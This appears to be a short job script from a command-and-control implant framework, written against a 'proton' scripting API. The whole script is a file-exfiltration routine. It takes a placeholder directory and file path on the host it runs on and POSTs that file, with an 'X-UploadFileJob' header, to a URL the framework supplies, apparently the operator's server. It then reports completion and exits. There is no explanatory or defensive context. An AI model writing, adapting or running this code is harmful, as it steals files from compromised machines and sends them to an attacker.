try
{
    var headers = {};
    headers["X-UploadFileJob"] = "true";
    var path = proton.file.getPath( "~DIRECTORY~\\~FILE~");

    proton.http.downloadEx("POST", proton.work.make_url(), headers, path);
    proton.work.report("Completed");
}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
